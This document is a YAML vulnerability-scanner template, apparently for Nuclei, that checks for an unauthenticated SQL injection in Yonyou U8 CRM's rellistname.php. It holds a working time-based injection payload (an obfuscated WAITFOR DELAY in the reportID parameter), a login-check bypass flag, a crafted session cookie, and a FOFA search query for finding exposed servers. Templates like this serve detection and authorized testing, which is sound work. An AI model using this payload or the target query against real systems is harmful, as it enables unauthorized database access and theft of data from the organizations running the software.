id: poc-yaml-yongyon-u8-crm-rellistname-php-sqli
info:
  name: 用友U8 CRM rellistname.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 用友U8+CRM
    fofa: body="用友U8CRM"

variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - method: GET
    path:
      - "/config/rellistname.php?DontCheckLogin=1&objType=1&reportID=1+wAiTFOR+DeLAy'0:0:{{t1}}'--+-"
    headers:
      Cookie: "PHPSESSID=bgsesstimeout-;"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "用友U8CRM"
          - "url:"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
